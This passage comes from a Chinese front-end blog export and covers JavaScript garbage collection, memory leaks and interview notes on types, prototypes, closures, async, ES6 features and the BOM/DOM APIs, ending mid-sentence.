在函数声明一个变量的时候，就将这个变量标记为“进入环境”。从逻辑上讲，永远都不能释放进入环境的变量作占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。垃圾回收器在运行时候会给存储在内存中中的所有变量都加上标记。然后它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）。在此之后再被标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清楚工作，销毁那些带标记的值并回收他们所占用的内存空间 function test()&#123; var a = 10 ; //被标记 ，进入环境 var b = 20 ; //被标记 ，进入环境 &#125; test(); //执行完毕 之后 a、b又被标离开环境，被回收。 引用计数（现代浏览器不再使用） 引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。 但是很重要的一点是当遇到循环引用的时候，函数的引用次数就不会为0，所以不会被垃圾回收器回收内存，会造成内存泄露。在IE中涉及DOM对象，就会存在循环引用的问题。 function test()&#123; var a = &#123;&#125; ; //a的引用次数为0 var b = a ; //a的引用次数加1，为1 var c =a; //a的引用次数再加1，为2 var b =&#123;&#125;; //b解除对a的引用，a的引用次数减1，为1 &#125; // 循环引用 function cycle() &#123; var o1 = &#123;&#125;; var o2 = &#123;&#125;; o1.a = o2; o2.a = o1; return &quot;cycle reference!&quot; &#125; cycle(); //数组 let arr = [1,2,3] 虽然这里没有引用arr，arr对他的值发生了引用，所以会一直存在内存中，可以采用 arr=null来解除引用 虽然有了自动垃圾收集机制，我们可以不必太过关注一些内存泄漏的问题，但有些情况下还是会发生这种问题 js的常见内存泄漏 全局变量引起的内存泄漏 function leaks()&#123; leak = &#x27;xxxxxx&#x27;;//leak 成为一个全局变量，不会被回收 &#125; 闭包引起的内存泄漏 var leaks = (function()&#123; var leak = &#x27;xxxxxx&#x27;;// 被闭包所引用，不会被回收 return function()&#123; console.log(leak); &#125; &#125;)() dom清空或删除时，事件未清除导致的内存泄漏 &lt;div id=&quot;container&quot;&gt; &lt;/div&gt; $(&#x27;#container&#x27;).bind(&#x27;click&#x27;, function()&#123; console.log(&#x27;click&#x27;); &#125;).remove(); // zepto 和原生 js下，#container dom 元素，还在内存里jquery 的 empty和 remove会帮助开发者避免这个问题 &lt;div id=&quot;container&quot;&gt; &lt;/div&gt; $(&#x27;#container&#x27;).bind(&#x27;click&#x27;, function()&#123; console.log(&#x27;click&#x27;); &#125;).off(&#x27;click&#x27;).remove(); //把事件清除了，即可从内存中移除 计时器或回调函数 定时器setInterval var a = fun(); setInterval(function()&#123; var node = document.getElementById(&#x27;node&#x27;); if(node)&#123; node.innerHTML = &#x27;test&#x27;; &#125; &#125;，1000); 节点node或数据不需要时，定时器setInterval依然指向这些数据，所以即使node节点被溢出，interval仍旧存活并且垃圾回收期没法回收。 解决是终止定时器。 这种循环定时器，是一定要设置关闭条件，然后将其clear并且将timer指向null] 解决方法及性能优化 发生内存泄漏肯定是不愿看到的，我们可以采取： 一旦确定数据不再使用，可以手动将其值设置为null来释放其引用。 —— 解除引用。","categories":[],"tags":[]},{"title":"前端知识点1901","slug":"前端知识点190111","date":"2019-01-11T06:11:16.000Z","updated":"2023-02-23T03:30:13.099Z","comments":true,"path":"2019/01/11/前端知识点190111/","link":"","permalink":"https://harrypangpang.github.io/2019/01/11/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9190111/","excerpt":"","text":"一面 1：ES 基础知识点与高频考题解析 JavaScript 是 ECMAScript 规范的一种实现，本小节重点梳理下 ECMAScript 中的常考知识点，然后就一些容易出现的题目进行解析。 知识点梳理 变量类型 JS 的数据类型分类和判断 值类型和引用类型 原型与原型链（继承） 原型和原型链定义 继承写法 作用域和闭包 执行上下文 this 闭包是什么 异步 同步 vs 异步 异步和单线程 前端异步的场景 ES6/7 新标准的考查 箭头函数 Module Class Set 和 Map Promise 变量类型 JavaScript 是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型。 ECMAScript 中定义了 6 种原始类型： Boolean String Number Null Undefined Symbol（ES6 新定义） 注意：原始类型不包含 Object。 题目：类型判断用到哪些方法？ typeof typeof xxx得到的值有以下几种类型：undefined``boolean``number``string``object``function、symbol ，比较简单，不再一一演示了。这里需要注意的有三点： typeof null结果是object ，实际这是typeof的一个bug，null是原始值，非引用类型 typeof [1, 2]结果是object，结果中没有array这一项，引用类型除了function其他的全部都是object typeof Symbol() 用typeof获取symbol类型的值得到的是symbol，这是 ES6 新增的知识点 instanceof 用于实例和构造函数的对应。例如判断一个变量是否是数组，使用typeof无法判断，但可以使用[1, 2] instanceof Array来判断。因为，[1, 2]是数组，它的构造函数就是Array。同理： function Foo(name) &#123; this.name = name &#125; var foo = new Foo('bar') console.log(foo instanceof Foo) // true 复制 题目：值类型和引用类型的区别 值类型 vs 引用类型 除了原始类型，ES 还有引用类型，上文提到的typeof识别出来的类型中，只有object和function是引用类型，其他都是值类型。 根据 JavaScript 中的变量类型传递方式，又分为值类型和引用类型，值类型变量包括 Boolean、String、Number、Undefined、Null，引用类型包括了 Object 类的所有，如 Date、Array、Function 等。在参数传递方式上，值类型是按值传递，引用类型是按共享传递。 下面通过一个小题目，来看下两者的主要区别，以及实际开发中需要注意的地方。 // 值类型 var a = 10 var b = a b = 20 console.log(a) // 10 console.log(b) // 20 复制 上述代码中，a``b都是值类型，两者分别修改赋值，相互之间没有任何影响。再看引用类型的例子： // 引用类型 var a = &#123;x: 10, y: 20&#125; var b = a b.x = 100 b.y = 200 console.log(a) // &#123;x: 100, y: 200&#125; console.log(b) // &#123;x: 100, y: 200&#125; 复制 上述代码中，a``b都是引用类型。在执行了b = a之后，修改b的属性值，a的也跟着变化。因为a和b都是引用类型，指向了同一个内存地址，即两者引用的是同一个值，因此b修改属性时，a的值随之改动。 再借助题目进一步讲解一下。 说出下面代码的执行结果，并分析其原因。 function foo(a)&#123; a = a * 10; &#125; function bar(b)&#123; b.value = 'new'; &#125; var a = 1; var b = &#123;value: 'old'&#125;; foo(a); bar(b); console.log(a); // 1 console.log(b); // value: new 复制 通过代码执行，会发现： a的值没有发生改变 而b的值发生了改变 这就是因为Number类型的a是按值传递的，而Object类型的b是按共享传递的。 JS 中这种设计的原因是：按值传递的类型，复制一份存入栈内存，这类类型一般不占用太多内存，而且按值传递保证了其访问速度。按共享传递的类型，是复制其引用，而不是整个复制其值（C 语言中的指针），保证过大的对象等不会因为不停复制内容而造成内存的浪费。 引用类型经常会在代码中按照下面的写法使用，或者说容易不知不觉中造成错误！ var obj = &#123; a: 1, b: [1,2,3] &#125; var a = obj.a var b = obj.b a = 2 b.push(4) console.log(obj, a, b) 复制 虽然obj本身是个引用类型的变量（对象），但是内部的a和b一个是值类型一个是引用类型，a的赋值不会改变obj.a，但是b的操作却会反映到obj对象上。 原型和原型链 JavaScript 是基于原型的语言，原型理解起来非常简单，但却特别重要，下面还是通过题目来理解下JavaScript 的原型概念。 题目：如何理解 JavaScript 的原型 对于这个问题，可以从下面这几个要点来理解和回答，下面几条必须记住并且理解 所有的引用类型（数组、对象、函数），都具有对象特性，即可自由扩展属性（null除外） 所有的引用类型（数组、对象、函数），都有一个__proto__属性，属性值是一个普通的对象 所有的函数，都有一个prototype属性，属性值也是一个普通的对象 所有的引用类型（数组、对象、函数），__proto__属性值指向它的构造函数的prototype属性值 通过代码解释一下，大家可自行运行以下代码，看结果。 // 要点一：自由扩展属性 var obj = &#123;&#125;; obj.a = 100; var arr = []; arr.a = 100; function fn () &#123;&#125; fn.a = 100; // 要点二：__proto__ console.log(obj.__proto__); console.log(arr.__proto__); console.log(fn.__proto__); // 要点三：函数有 prototype console.log(fn.prototype) // 要点四：引用类型的 __proto__ 属性值指向它的构造函数的 prototype 属性值 console.log(obj.__proto__ === Object.prototype) 复制 原型 先写一个简单的代码示例。 // 构造函数 function Foo(name, age) &#123; this.name = name &#125; Foo.prototype.alertName = function () &#123; alert(this.name) &#125; // 创建示例 var f = new Foo('zhangsan') f.printName = function () &#123; console.log(this.name) &#125; // 测试 f.printName() f.alertName() 复制 执行printName时很好理解，但是执行alertName时发生了什么？这里再记住一个重点 当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的__proto__（即它的构造函数的prototype）中寻找，因此f.alertName就会找到Foo.prototype.alertName。 那么如何判断这个属性是不是对象本身的属性呢？使用hasOwnProperty，常用的地方是遍历一个对象的时候。 var item for (item in f) &#123; // 高级浏览器已经在 for in 中屏蔽了来自原型的属性，但是这里建议大家还是加上这个判断，保证程序的健壮性 if (f.hasOwnProperty(item)) &#123; console.log(item) &#125; &#125; 复制 题目：如何理解 JS 的原型链 原型链 还是接着上面的示例，如果执行f.toString()时，又发生了什么？ // 省略 N 行 // 测试 f.printName() f.alertName() f.toString() 复制 因为f本身没有toString()，并且f.__proto__（即Foo.prototype）中也没有toString。这个问题还是得拿出刚才那句话——当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的__proto__（即它的构造函数的prototype）中寻找。 如果在f.__proto__中没有找到toString，那么就继续去f.__proto__.__proto__中寻找，因为f.__proto__就是一个普通的对象而已嘛！ f.__proto__即Foo.prototype，没有找到toString，继续往上找 f.__proto__.__proto__即Foo.prototype.__proto__。Foo.prototype就是一个普通的对象，因此Foo.prototype.__proto__就是Object.prototype，在这里可以找到toString 因此f.toString最终对应到了Object.prototype.toString 这样一直往上找，你会发现是一个链式的结构，所以叫做“原型链”。如果一直找到最上层都没有找到，那么就宣告失败，返回undefined。最上层是什么 —— Object.prototype.__proto__ === null 原型链中的this 所有从原型或更高级原型中得到、执行的方法，其中的this在执行时，就指向了当前这个触发事件执行的对象。因此printName和alertName中的this都是f。 作用域和闭包 作用域和闭包是前端面试中，最可能考查的知识点。例如下面的题目： 题目：现在有个 HTML 片段，要求编写代码，点击编号为几的链接就alert弹出其编号 &lt;ul&gt; &lt;li&gt;编号1，点击我请弹出1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;/ul&gt; 复制 一般不知道这个题目用闭包的话，会写出下面的代码： var list = document.getElementsByTagName('li'); for (var i = 0; i &lt; list.length; i++) &#123; list[i].addEventListener('click', function()&#123; alert(i + 1) &#125;, true) &#125; 复制 实际上执行才会发现始终弹出的是6，这时候就应该通过闭包来解决： var list = document.getElementsByTagName('li'); for (var i = 0; i &lt; list.length; i++) &#123; list[i].addEventListener('click', function(i)&#123; return function()&#123; alert(i + 1) &#125; &#125;(i), true) &#125; 复制 要理解闭包，就需要我们从「执行上下文」开始讲起。 执行上下文 先讲一个关于 变量提升 的知识点，面试中可能会遇见下面的问题，很多候选人都回答错误： 题目：说出下面执行的结果（这里笔者直接注释输出了） console.log(a) // undefined var a = 100 fn('zhangsan') // 'zhangsan' 20 function fn(name) &#123; age = 20 console.log(name, age) var age &#125; console.log(b); // 这里报错 // Uncaught ReferenceError: b is not defined b = 100; 复制 在一段 JS 脚本（即一个&lt;script&gt;标签中）执行之前，要先解析代码（所以说 JS 是解释执行的脚本语言），解析的时候会先创建一个 全局执行上下文 环境，先把代码中即将执行的（内部函数的不算，因为你不知道函数何时执行）变量、函数声明都拿出来。变量先暂时赋值为undefined，函数则先声明好可使用。这一步做完了，然后再开始正式执行程序。再次强调，这是在代码执行之前才开始的工作。 我们来看下上面的面试小题目，为什么a是undefined，而b却报错了，实际 JS 在代码执行之前，要「全文解析」，发现var a，知道有个a的变量，存入了执行上下文，而b没有找到var关键字，这时候没有在执行上下文提前「占位」，所以代码执行的时候，提前报到的a是有记录的，只不过值暂时还没有赋值，即为undefined，而b在执行上下文没有找到，自然会报错（没有找到b的引用）。 另外，一个函数在执行之前，也会创建一个 函数执行上下文 环境，跟 全局上下文 差不多，不过 函数执行上下文 中会多出this``arguments和函数的参数。参数和arguments好理解，这里的this咱们需要专门讲解。 总结一下： 范围：一段&lt;script&gt;、js 文件或者一个函数 全局上下文：变量定义，函数声明 函数上下文：变量定义，函数声明，this，arguments this 先搞明白一个很重要的概念 —— this的值是在执行的时候才能确认，定义的时候不能确认！ 为什么呢 —— 因为this是执行上下文环境的一部分，而执行上下文需要在代码执行之前确定，而不是定义的时候。看如下例子 var a = &#123; name: 'A', fn: function () &#123; console.log(this.name) &#125; &#125; a.fn() // this === a a.fn.call(&#123;name: 'B'&#125;) // this === &#123;name: 'B'&#125; var fn1 = a.fn fn1() // this === window 复制 this执行会有不同，主要集中在这几个场景中 作为构造函数执行，构造函数中 作为对象属性执行，上述代码中a.fn() 作为普通函数执行，上述代码中fn1() 用于call``apply``bind，上述代码中a.fn.call(&#123;name: 'B'&#125;) 下面再来讲解下什么是作用域和作用域链，作用域链和作用域也是常考的题目。 题目：如何理解 JS 的作用域和作用域链 作用域 ES6 之前 JS 没有块级作用域。例如 if (true) &#123; var name = 'zhangsan' &#125; console.log(name) 复制 从上面的例子可以体会到作用域的概念，作用域就是一个独立的地盘，让变量不会外泄、暴露出去。上面的name就被暴露出去了，因此，JS 没有块级作用域，只有全局作用域和函数作用域。 var a = 100 function fn() &#123; var a = 200 console.log('fn', a) &#125; console.log('global', a) fn() 复制 全局作用域就是最外层的作用域，如果我们写了很多行 JS 代码，变量定义都没有用函数包括，那么它们就全部都在全局作用域中。这样的坏处就是很容易撞车、冲突。 // 张三写的代码中 var data = &#123;a: 100&#125; // 李四写的代码中 var data = &#123;x: true&#125; 复制 这就是为何 jQuery、Zepto 等库的源码，所有的代码都会放在(function()&#123;....&#125;)()中。因为放在里面的所有变量，都不会被外泄和暴露，不会污染到外面，不会对其他的库或者 JS 脚本造成影响。这是函数作用域的一个体现。 附：ES6 中开始加入了块级作用域，使用let定义变量即可，如下： if (true) &#123; let name = 'zhangsan' &#125; console.log(name) // undefined 复制 作用域链 首先认识一下什么叫做 自由变量 。如下代码中，console.log(a)要得到a变量，但是在当前的作用域中没有定义a（可对比一下b）。当前作用域没有定义的变量，这成为 自由变量 。自由变量如何得到 —— 向父级作用域寻找。 var a = 100 function fn() &#123; var b = 200 console.log(a) console.log(b) &#125; fn() 复制 如果父级也没呢？再一层一层向上寻找，直到找到全局作用域还是没找到，就宣布放弃。这种一层一层的关系，就是 作用域链 。 var a = 100 function F1() &#123; var b = 200 function F2() &#123; var c = 300 console.log(a) // 自由变量，顺作用域链向父作用域找 console.log(b) // 自由变量，顺作用域链向父作用域找 console.log(c) // 本作用域的变量 &#125; F2() &#125; F1() 复制 闭包 讲完这些内容，我们再来看一个例子，通过例子来理解闭包。 function F1() &#123; var a = 100 return function () &#123; console.log(a) &#125; &#125; var f1 = F1() var a = 200 f1() 复制 自由变量将从作用域链中去寻找，但是 依据的是函数定义时的作用域链，而不是函数执行时，以上这个例子就是闭包。闭包主要有两个应用场景： 函数作为返回值，上面的例子就是 函数作为参数传递，看以下例子 function F1() { var a = 100 return function () { console.log(a) } } function F2(f1) { var a = 200 console.log(f1()) } var f1 = F1() F2(f1) 复制 至此，对应着「作用域和闭包」这部分一开始的点击弹出alert的代码再看闭包，就很好理解了。 异步 异步和同步也是面试中常考的内容，下面笔者来讲解下同步和异步的区别。 同步 vs 异步 先看下面的 demo，根据程序阅读起来表达的意思，应该是先打印100，1秒钟之后打印200，最后打印300。但是实际运行根本不是那么回事。 console.log(100) setTimeout(function () &#123; console.log(200) &#125;, 1000) console.log(300) 复制 再对比以下程序。先打印100，再弹出200（等待用户确认），最后打印300。这个运行效果就符合预期要求。 console.log(100) alert(200) // 1秒钟之后点击确认 console.log(300) 复制 这俩到底有何区别？—— 第一个示例中间的步骤根本没有阻塞接下来程序的运行，而第二个示例却阻塞了后面程序的运行。前面这种表现就叫做 异步（后面这个叫做 同步 ），即不会阻塞后面程序的运行。 异步和单线程 JS 需要异步的根本原因是 JS 是单线程运行的，即在同一时间只能做一件事，不能“一心二用”。 一个 Ajax 请求由于网络比较慢，请求需要 5 秒钟。如果是同步，这 5 秒钟页面就卡死在这里啥也干不了了。异步的话，就好很多了，5 秒等待就等待了，其他事情不耽误做，至于那 5 秒钟等待是网速太慢，不是因为 JS 的原因。 讲到单线程，我们再来看个真题： 题目：讲解下面代码的执行过程和结果 var a = true; setTimeout(function()&#123; a = false; &#125;, 100) while(a)&#123; console.log('while执行了') &#125; 复制 这是一个很有迷惑性的题目，不少候选人认为100ms之后，由于a变成了false，所以while就中止了，实际不是这样，因为JS是单线程的，所以进入while循环之后，没有「时间」（线程）去跑定时器了，所以这个代码跑起来是个死循环！ 前端异步的场景 定时 setTimeout``setInverval 网络请求，如 Ajax``&lt;img&gt;加载 Ajax 代码示例 console.log('start') $.get('./data1.json', function (data1) &#123; console.log(data1) &#125;) console.log('end') 复制 img 代码示例（常用于打点统计） console.log('start') var img = document.createElement('img') // 或者 img = new Image() img.onload = function () &#123; console.log('loaded') img.onload = null &#125; img.src = '/xxx.png' console.log('end') 复制 ES6/7 新标准的考查 题目：ES6 箭头函数中的this和普通函数中的有什么不同 箭头函数 箭头函数是 ES6 中新的函数定义形式，function name(arg1, arg2) &#123;...&#125;可以使用(arg1, arg2) =&gt; &#123;...&#125;来定义。示例如下： // JS 普通函数 var arr = [1, 2, 3] arr.map(function (item) &#123; console.log(index) return item + 1 &#125;) // ES6 箭头函数 const arr = [1, 2, 3] arr.map((item, index) =&gt; &#123; console.log(index) return item + 1 &#125;) 复制 箭头函数存在的意义，第一写起来更加简洁，第二可以解决 ES6 之前函数执行中this是全局变量的问题，看如下代码 function fn() &#123; console.log('real', this) // &#123;a: 100&#125; ，该作用域下的 this 的真实的值 var arr = [1, 2, 3] // 普通 JS arr.map(function (item) &#123; console.log('js', this) // window 。普通函数，这里打印出来的是全局变量，令人费解 return item + 1 &#125;) // 箭头函数 arr.map(item =&gt; &#123; console.log('es6', this) // &#123;a: 100&#125; 。箭头函数，这里打印的就是父作用域的 this return item + 1 &#125;) &#125; fn.call(&#123;a: 100&#125;) 复制 题目：ES6 模块化如何使用？ Module ES6 中模块化语法更加简洁，直接看示例。 如果只是输出一个唯一的对象，使用export default即可，代码如下 // 创建 util1.js 文件，内容如 export default &#123; a: 100 &#125; // 创建 index.js 文件，内容如 import obj from './util1.js' console.log(obj) 复制 如果想要输出许多个对象，就不能用default了，且import时候要加&#123;...&#125;，代码如下 // 创建 util2.js 文件，内容如 export function fn1() &#123; alert('fn1') &#125; export function fn2() &#123; alert('fn2') &#125; // 创建 index.js 文件，内容如 import &#123; fn1, fn2 &#125; from './util2.js' fn1() fn2() 复制 题目：ES6 class 和普通构造函数的区别 class class 其实一直是 JS 的关键字（保留字），但是一直没有正式使用，直到 ES6 。 ES6 的 class 就是取代之前构造函数初始化对象的形式，从语法上更加符合面向对象的写法。例如： JS 构造函数的写法 function MathHandle(x, y) &#123; this.x = x; this.y = y; &#125; MathHandle.prototype.add = function () &#123; return this.x + this.y; &#125;; var m = new MathHandle(1, 2); console.log(m.add()) 复制 用 ES6 class 的写法 class MathHandle &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; add() &#123; return this.x + this.y; &#125; &#125; const m = new MathHandle(1, 2); console.log(m.add()) 复制 注意以下几点，全都是关于 class 语法的： class 是一种新的语法形式，是class Name &#123;...&#125;这种形式，和函数的写法完全不一样 两者对比，构造函数函数体的内容要放在 class 中的constructor函数中，constructor即构造器，初始化实例时默认执行 class 中函数的写法是add() &#123;...&#125;这种形式，并没有function关键字 使用 class 来实现继承就更加简单了，至少比构造函数实现继承简单很多。看下面例子 JS 构造函数实现继承 // 动物 function Animal() &#123; this.eat = function () &#123; console.log('animal eat') &#125; &#125; // 狗 function Dog() &#123; this.bark = function () &#123; console.log('dog bark') &#125; &#125; Dog.prototype = new Animal() // 哈士奇 var hashiqi = new Dog() 复制 ES6 class 实现继承 class Animal &#123; constructor(name) &#123; this.name = name &#125; eat() &#123; console.log(`$&#123;this.name&#125; eat`) &#125; &#125; class Dog extends Animal &#123; constructor(name) &#123; super(name) this.name = name &#125; say() &#123; console.log(`$&#123;this.name&#125; say`) &#125; &#125; const dog = new Dog('哈士奇') dog.say() dog.eat() 复制 注意以下两点： 使用extends即可实现继承，更加符合经典面向对象语言的写法，如 Java 子类的constructor一定要执行super()，以调用父类的constructor 题目：ES6 中新增的数据类型有哪些？ Set 和 Map Set 和 Map 都是 ES6 中新增的数据结构，是对当前 JS 数组和对象这两种重要数据结构的扩展。由于是新增的数据结构，目前尚未被大规模使用，但是作为前端程序员，提前了解是必须做到的。先总结一下两者最关键的地方： Set 类似于数组，但数组可以允许元素重复，Set 不允许元素重复 Map 类似于对象，但普通对象的 key 必须是字符串或者数字，而 Map 的 key 可以是任何数据类型 Set Set 实例不允许元素有重复，可以通过以下示例证明。可以通过一个数组初始化一个 Set 实例，或者通过add添加元素，元素不能重复，重复的会被忽略。 // 例1 const set = new Set([1, 2, 3, 4, 4]); console.log(set) // Set(4) &#123;1, 2, 3, 4&#125; // 例2 const set = new Set(); [2, 3, 5, 4, 5, 8, 8].forEach(item =&gt; set.add(item)); for (let item of set) &#123; console.log(item); &#125; // 2 3 5 4 8 复制 Set 实例的属性和方法有 size：获取元素数量。 add(value)：添加元素，返回 Set 实例本身。 delete(value)：删除元素，返回一个布尔值，表示删除是否成功。 has(value)：返回一个布尔值，表示该值是否是 Set 实例的元素。 clear()：清除所有元素，没有返回值。 const s = new Set(); s.add(1).add(2).add(2); // 添加元素 s.size // 2 s.has(1) // true s.has(2) // true s.has(3) // false s.delete(2); s.has(2) // false s.clear(); console.log(s); // Set(0) {} 复制 Set 实例的遍历，可使用如下方法 keys()：返回键名的遍历器。 values()：返回键值的遍历器。不过由于 Set 结构没有键名，只有键值（或者说键名和键值是同一个值），所以keys()和values()返回结果一致。 entries()：返回键值对的遍历器。 forEach()：使用回调函数遍历每个成员。 let set = new Set([‘aaa’, ‘bbb’, ‘ccc’]); for (let item of set.keys()) { console.log(item); } // aaa // bbb // ccc for (let item of set.values()) { console.log(item); } // aaa // bbb // ccc for (let item of set.entries()) { console.log(item); } // [“aaa”, “aaa”] // [“bbb”, “bbb”] // [“ccc”, “ccc”] set.forEach((value, key) =&gt; console.log(key + ’ : ’ + value)) // aaa : aaa // bbb : bbb // ccc : ccc 复制 Map Map 的用法和普通对象基本一致，先看一下它能用非字符串或者数字作为 key 的特性。 const map = new Map(); const obj = &#123;p: 'Hello World'&#125;; map.set(obj, 'OK') map.get(obj) // &quot;OK&quot; map.has(obj) // true map.delete(obj) // true map.has(obj) // false 复制 需要使用new Map()初始化一个实例，下面代码中set``get``has``delete顾名即可思义（下文也会演示）。其中，map.set(obj, 'OK')就是用对象作为的 key （不光可以是对象，任何数据类型都可以），并且后面通过map.get(obj)正确获取了。 Map 实例的属性和方法如下： size：获取成员的数量 set：设置成员 key 和 value get：获取成员属性值 has：判断成员是否存在 delete：删除成员 clear：清空所有 const map = new Map(); map.set(‘aaa’, 100); map.set(‘bbb’, 200); map.size // 2 map.get(‘aaa’) // 100 map.has(‘aaa’) // true map.delete(‘aaa’) map.has(‘aaa’) // false map.clear() 复制 Map 实例的遍历方法有： keys()：返回键名的遍历器。 values()：返回键值的遍历器。 entries()：返回所有成员的遍历器。 forEach()：遍历 Map 的所有成员。 const map = new Map(); map.set(‘aaa’, 100); map.set(‘bbb’, 200); for (let key of map.keys()) { console.log(key); } // “aaa” // “bbb” for (let value of map.values()) { console.log(value); } // 100 // 200 for (let item of map.entries()) { console.log(item[0], item[1]); } // aaa 100 // bbb 200 // 或者 for (let [key, value] of map.entries()) { console.log(key, value); } // aaa 100 // bbb 200 复制 Promise Promise是 CommonJS 提出来的这一种规范，有多个版本，在 ES6 当中已经纳入规范，原生支持 Promise 对象，非 ES6 环境可以用类似 Bluebird、Q 这类库来支持。 Promise 可以将回调变成链式调用写法，流程更加清晰，代码更加优雅。 简单归纳下 Promise：三个状态、两个过程、一个方法，快速记忆方法：3-2-1 三个状态：pending、fulfilled、rejected 两个过程： pending→fulfilled（resolve） pending→rejected（reject） 一个方法：then 当然还有其他概念，如catch、 Promise.all/race，这里就不展开了。 关于 ES6/7 的考查内容还有很多，本小节就不逐一介绍了，如果想继续深入学习，可以在线看《ES6入门》。 小结 本小节主要总结了 ES 基础语法中面试经常考查的知识点，包括之前就考查较多的原型、异步、作用域，以及 ES6 的一些新内容，这些知识点希望大家都要掌握。 上一篇：准备：简历编写和面试前准备下一篇：一面 2：JS-Web-API 知识点与高频考题解析 一面 2：JS-Web-API 知识点与高频考题解析 除 ES 基础之外，Web 前端经常会用到一些跟浏览器相关的 API，接下来我们一起梳理一下。 知识点梳理 BOM 操作 DOM 操作 事件绑定 Ajax 存储 BOM BOM（浏览器对象模型）是浏览器本身的一些信息的设置和获取，例如获取浏览器的宽度、高度，设置让浏览器跳转到哪个地址。 navigator screen location history 这些对象就是一堆非常简单粗暴的 API，没任何技术含量，讲起来一点意思都没有，大家去 MDN 或者 w3school 这种网站一查就都明白了。面试的时候，面试官基本不会出太多这方面的题目，因为只要基础知识过关了，这些 API 即便你记不住，上网一查也都知道了。下面列举一下常用功能的代码示例 获取浏览器特性（即俗称的UA）然后识别客户端，例如判断是不是 Chrome 浏览器 var ua = navigator.userAgent var isChrome = ua.indexOf('Chrome') console.log(isChrome) 复制 获取屏幕的宽度和高度 console.log(screen.width) console.log(screen.height) 复制 获取网址、协议、path、参数、hash 等 // 例如当前网址是 https://juejin.im/timeline/frontend?a=10&amp;b=10#some console.log(location.href) // https://juejin.im/timeline/frontend?a=10&amp;b=10#some console.log(location.protocol) // https: console.log(location.pathname) // /timeline/frontend console.log(location.search) // ?a=10&amp;b=10 console.log(location.hash) // #some 复制 另外，还有调用浏览器的前进、后退功能等 history.back() history.forward() 复制 DOM 题目：DOM 和 HTML 区别和联系 什么是 DOM 讲 DOM 先从 HTML 讲起，讲 HTML 先从 XML 讲起。XML 是一种可扩展的标记语言，所谓可扩展就是它可以描述任何结构化的数据，它是一棵树！ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don't forget me this weekend!&lt;/body&gt; &lt;other&gt; &lt;a&gt;&lt;/a&gt; &lt;b&gt;&lt;/b&gt; &lt;/other&gt; &lt;/note&gt; 复制 HTML 是一个有既定标签标准的 XML 格式，标签的名字、层级关系和属性，都被标准化（否则浏览器无法解析）。同样，它也是一棵树。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;p&gt;this is p&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 复制 我们开发完的 HTML 代码会保存到一个文档中（一般以.html或者.htm结尾），文档放在服务器上，浏览器请求服务器，这个文档被返回。因此，最终浏览器拿到的是一个文档而已，文档的内容就是 HTML 格式的代码。 但是浏览器要把这个文档中的 HTML 按照标准渲染成一个页面，此时浏览器就需要将这堆代码处理成自己能理解的东西，也得处理成 JS 能理解的东西，因为还得允许 JS 修改页面内容呢。 基于以上需求，浏览器就需要把 HTML 转变成 DOM，HTML 是一棵树，DOM 也是一棵树。对 DOM 的理解，可以暂时先抛开浏览器的内部因素，先从 JS 着手，即可以认为 DOM 就是 JS 能识别的 HTML 结构，一个普通的 JS 对象或者数组。 ![DOM图示](data:image/svg+xml;utf8,) 获取 DOM 节点 最常用的 DOM API 就是获取节点，其中常用的获取方法如下面代码示例： // 通过 id 获取 var div1 = document.getElementById('div1') // 元素 // 通过 tagname 获取 var divList = document.getElementsByTagName('div') // 集合 console.log(divList.length) console.log(divList[0]) // 通过 class 获取 var containerList = document.getElementsByClassName('container') // 集合 // 通过 CSS 选择器获取 var pList = document.querySelectorAll('p') // 集合 复制 题目：property 和 attribute 的区别是什么？ property DOM 节点就是一个 JS 对象，它符合之前讲述的对象的特征 —— 可扩展属性，因为 DOM 节点本质上也是一个 JS 对象。因此，如下代码所示，p可以有style属性，有className``nodeName``nodeType属性。注意，这些都是 JS 范畴的属性，符合 JS 语法标准的。 var pList = document.querySelectorAll('p') var p = pList[0] console.log(p.style.width) // 获取样式 p.style.width = '100px' // 修改样式 console.log(p.className) // 获取 class p.className = 'p1' // 修改 class // 获取 nodeName 和 nodeType console.log(p.nodeName) console.log(p.nodeType) 复制 attribute property 的获取和修改，是直接改变 JS 对象，而 attribute 是直接改变 HTML 的属性，两种有很大的区别。attribute 就是对 HTML 属性的 get 和 set，和 DOM 节点的 JS 范畴的 property 没有关系。 var pList = document.querySelectorAll('p') var p = pList[0] p.getAttribute('data-name') p.setAttribute('data-name', 'juejin') p.getAttribute('style') p.setAttribute('style', 'font-size:30px;') 复制 而且，get 和 set attribute 时，还会触发 DOM 的查询或者重绘、重排，频繁操作会影响页面性能。 题目：DOM 操作的基本 API 有哪些？ DOM 树操作 新增节点 var div1 = document.getElementById('div1') // 添加新节点 var p1 = document.createElement('p') p1.innerHTML = 'this is p1' div1.appendChild(p1) // 添加新创建的元素 // 移动已有节点。注意，这里是“移动”，并不是拷贝 var p2 = document.getElementById('p2') div1.appendChild(p2) 复制 获取父元素 var div1 = document.getElementById('div1') var parent = div1.parentElement 复制 获取子元素 var 